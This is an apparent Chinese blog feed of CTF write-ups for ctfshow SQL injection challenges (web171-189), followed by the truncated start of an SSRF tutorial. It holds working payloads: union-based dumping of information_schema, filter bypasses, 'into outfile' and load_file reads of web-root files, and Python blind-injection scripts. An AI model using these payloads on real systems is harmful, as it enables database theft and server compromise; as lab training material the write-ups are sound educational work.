title="web188"></a>web188</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line">  <span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用户名检测</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码检测</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//密码判断</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="title function_ invoke__">intval</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">      <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="variable">$flag</span>));</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>首先<code>SELECT * FROM kk where username = 1\u003C1 and password = 0</code></p><p>这是弱比较：字符串会转为0 ，所以0&#x3D;0永远成立</p><p><code>SELECT * FROM kk where username = 0 and password = 0</code>也可以</p><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120165822710.png" alt="image-20230120165822710"></p><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>load_file盲注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if(load_file(&#x27;/var/www/html/flag.php&#x27;)like(&#x27;flag&#123;%&#x27;),1,0);</span><br><span class="line">select if(load_file(&#x27;/var/www/html/flag.php&#x27;)regexp(&#x27;flag&#123;&#x27;),1,0);</span><br><span class="line">select if(load_file(&#x27;/var/www/html/flag.php&#x27;)rlike(&#x27;flag&#123;&#x27;),1,0);</span><br></pre></td></tr></table></figure><p>if里表达式正确就返回0，查询语句就变成了<code>where name=0</code>,此时账号正确，密码错误，返回错误信息</p><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120170711597.png" alt="image-20230120170711597"></p><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120170730421.png" alt="image-20230120170730421"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://eb8cee7c-c56c-4765-8c3f-d7b2568ca5a9.challenge.ctf.show/api/&quot;</span><br><span class="line">strs = &#x27;&#123;qwertyuiopasdfghjklzxcvbnm-0123456789&#125;&#x27;</span><br><span class="line">flag = &quot;ctfshow&#123;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    for j in strs:</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;username&quot;: &quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;.format(flag+j),</span><br><span class="line">            &quot;password&quot;: 9</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url=url, data=data)</span><br><span class="line">        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in req.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            if j == &quot;&#125;&quot;:</span><br><span class="line">                exit(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/20/ctfshow-web184~189/image-20230120171136701.png" alt="image-20230120171136701"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-sql注入（176-183）</title>
      <link href="/2023/01/19/ctfshow-web176~183/"/>
      <url>/2023/01/19/ctfshow-web176~183/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门-sql注入（176-183）"><a href="#ctfshow-web入门-sql注入（176-183）" class="headerlink" title="ctfshow-web入门-sql注入（176-183）"></a>ctfshow-web入门-sql注入（176-183）</h1><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>万能密码：<code>1&#39; or 1=1 -- x</code>,得到flag</p><p><img src="/2023/01/19/ctfshow-web176~183/image-20230119160743873.png" alt="image-20230119160743873"></p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>空格过滤了<code>/**/</code>绕过，<code>1&#39;/**/or/**/1=1/**/%23</code>,得到flag</p><p><img src="/2023/01/19/ctfshow-web176~183/image-20230119162212101.png" alt="image-20230119162212101"></p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>过滤了空格，*等，用%09绕过，<code>1&#39;%09or%091=1%09%23</code>，得到flag</p><p><img src="/2023/01/19/ctfshow-web176~183/image-20230119162732750.png" alt="image-20230119162732750"></p><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>这次把%09过滤了，可以用<code>1&#39;or&#39;1&#39;=&#39;1&#39;%23</code>,得到flag。</p><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>把所有空格都过滤了，<code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code>。</p><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p> and优先级高于or，1 and 0 or 1，让where直接查找flag<code>-1&#39;||username=&#39;flag</code>.</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p><strong>like可以模糊匹配</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;%fla%</span><br></pre></td></tr></table></figure><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>题目：</p><p><img src="/2023/01/19/ctfshow-web176~183/image-20230119170949335.png" alt="image-20230119170949335"></p><p>waf增加了，通过POST传参，结果会返回到下面第三个灰块那里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://857df83b-53d3-44b1-ad9d-92f1c79cfb85.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">strings = string.digits+string.ascii_letters+<span class="string">&quot;-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strings:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>: <span class="string">&quot;(ctfshow_user)where(substr(pass,1,&#123;0&#125;)like(&#x27;&#123;1&#125;&#x27;))&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i), flag+j)</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/19/ctfshow-web176~183/image-20230119173301129.png" alt="image-20230119173301129"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web入门-sql注入（171-175）</title>
      <link href="/2023/01/18/ctfshow-web171~175/"/>
      <url>/2023/01/18/ctfshow-web171~175/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="ctfshow-web入门-sql注入（171-175）"><a href="#ctfshow-web入门-sql注入（171-175）" class="headerlink" title="ctfshow-web入门-sql注入（171-175）"></a>ctfshow-web入门-sql注入（171-175）</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>1&#39; or 1=1 -- x</code>输出了所有数据，此时的sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;1&#x27; or 1=1 -- x&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>flag存在于username为flag的用户数据中，但是条件为username !&#x3D;’flag’，但and的优先级大于or。</p><p>所以是先<code>username !=&#39;flag&#39; and id = &#39;1&#39;</code>再<code>or 1=1</code>,false or true ，结果为真，所有用户数据被输出，得到flag</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>输入<code>1&#39;  and 1=1 -- x</code>、<code>1&#39;  and 1=1 -- x</code>，页面发生变化，说明存在注入点</p><p>输入<code>1&#39;  order by 2 -- x</code>有数据，<code>1&#39;  order by 3 -- x</code>报错，说明有两个字段</p><p><code>-1&#39;  union select 1,2 -- x</code>得到回显位置</p><p>查询数据库中所有表的名字：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select database(),group_concat(table_name) from information_schema.tables where table_schema=database() -- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql2.png" alt="sql2"></p><p>数据库名为ctfshow_web；有两张表ctfshow_user,ctfshow_user2</p><p>查询ctfshow_user2中所有列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="string">&#x27; -- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql3.png" alt="sql3"></p><p>查询ctfshow_user2中所有数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select database(),group_concat(id,username,password) from ctfshow_user2 -- x</span></span><br></pre></td></tr></table></figure><p>得到flag。<img src="/2023/01/18/ctfshow-web171~175/sql4.png" alt="sql4"></p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>题目：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>输入<code>1&#39;  and 1=1 -- x</code>、<code>1&#39;  and 1=1 -- x</code>，页面发生变化，说明存在注入点</p><p>输入<code>1&#39;  order by 3 -- x</code>有数据，<code>1&#39;  order by 4 -- x</code>报错，说明有三个字段</p><p><code>-1&#39;  union select 1,2,3 -- x</code>得到回显位置</p><p>查询数据库中所有表的名字：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() -- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql5.png" alt="sql5"></p><p>查询ctfshow_user3中所有列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user3<span class="string">&#x27; -- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql6.png" alt="sql6"></p><p>查询ctfshow_user3中所有数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,password from ctfshow_user3 -- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql7.png" alt="sql7"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>题目：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>检查结果是否有flag</span><br><span class="line">    if(<span class="operator">!</span>preg_match(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]<span class="operator">=</span><span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>返回值过滤了数字和flag</p><p>username&#x2F;password使用base64加密后，使用@A-@J表示0-9，再解密</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&quot;1&quot;,&quot;@A&quot;),&quot;2&quot;,&quot;@B&quot;),&quot;3&quot;,&quot;@C&quot;),&quot;4&quot;,&quot;@D&quot;),&quot;5&quot;,&quot;@E&quot;),&quot;6&quot;,&quot;@F&quot;),&quot;7&quot;,&quot;@G&quot;),&quot;8&quot;,&quot;@H&quot;),&quot;9&quot;,&quot;@I&quot;),&quot;0&quot;,&quot;@J&quot;) from ctfshow_user4 where username=&quot;flag&quot; -- x</span></span><br></pre></td></tr></table></figure><p>查询结果Y@CRmc@Bhvd@Cs@AZTI@AYTI@AMS@J@BODViLTQ@ANzQtYmQ@JNC@J@CYjhjZDFiNDUxMTR@I</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag64 = <span class="string">&quot;Y@CRmc@Bhvd@CsxYzk@JM@BQ@JNC@AhNWFiLTQwODktODE@CNC@J@BNzdlNTc@EODRjMTl@I&quot;</span> </span><br><span class="line">flag = flag64.replace(<span class="string">&quot;@A&quot;</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="string">&quot;@B&quot;</span>, <span class="string">&quot;2&quot;</span>).replace(<span class="string">&quot;@C&quot;</span>, <span class="string">&quot;3&quot;</span>).replace(<span class="string">&quot;@D&quot;</span>, <span class="string">&quot;4&quot;</span>).replace(<span class="string">&quot;@E&quot;</span>, <span class="string">&quot;5&quot;</span>).replace(<span class="string">&quot;@F&quot;</span>, <span class="string">&quot;6&quot;</span>).replace(<span class="string">&quot;@G&quot;</span>, <span class="string">&quot;7&quot;</span>).replace(<span class="string">&quot;@H&quot;</span>, <span class="string">&quot;8&quot;</span>).replace(<span class="string">&quot;@I&quot;</span>, <span class="string">&quot;9&quot;</span>).replace(<span class="string">&quot;@J&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>运行结果得flag:ctfshow{1c943d44-a5ab-4089-8174-677e57984c19}</p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查询语句</span><br><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from ctfshow_user5 where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>过滤ASCII0-127的字符</p><p>把flag查询结果传入1.txt，访问url&#x2F;1.txt文件获得flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>txt<span class="string">&#x27;-- x</span></span><br></pre></td></tr></table></figure><p><img src="/2023/01/18/ctfshow-web171~175/sql8.png" alt="sql8"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/2023/01/17/SSRF/"/>
      <url>/2023/01/17/SSRF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="1-SSRF介绍"><a href="#1-SSRF介绍" class="headerlink" title="1.SSRF介绍"></a>1.SSRF介绍</h2><p>服务器请求伪造（SSRF Server-Side Request Forgery）是一种由web服务器发出请求的漏洞，它能够请求到与它相连的内网资源（与外网隔离的内部系统）因此SSRF主要测试目标是内网系统。</p><p>很多web应用提供从其他服务器获取数据的功能，可以根据用户提交的URL访问对应资源（获取图片、下载文件、读取内容等。如果该功能作为代理通道去访问本地或远程服务器，这就是所谓的SSRF。</p><p>SSRF漏洞利用流程：</p><p><img src="/imgs/ssrf1.jpg"></p><h2 id="2-SSRF可能造成的危害"><a href="#2-SSRF可能造成的危害" class="headerlink" title="2.SSRF可能造成的危害"></a>2.SSRF可能造成的危害</h2><ol><li>对内网进行信息探测一端口扫描</li><li>对内网服务器进行漏洞扫描利用</li><li>对内网的Web应用进行安全测试，例如Structs2、SQL注入漏洞利用</li><li>对内网中的文件读取(fille协议)</li><li>在PHP环境中，如果搭建expect扩 展，可能被命令执行</li></ol><h2 id="3-产生SSRF漏洞的代码"><a href="#3-产生SSRF漏洞的代码" class="headerlink" title="3.产生SSRF漏洞的代码"></a>3.产生SSRF漏洞的代码</h2><h5 id="1-以下代码存在SSRF漏洞"><a href="#1-以下代码存在SSRF漏洞" class="headerlink" title="1.以下代码存在SSRF漏洞"></a>1.以下代码存在SSRF漏洞</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 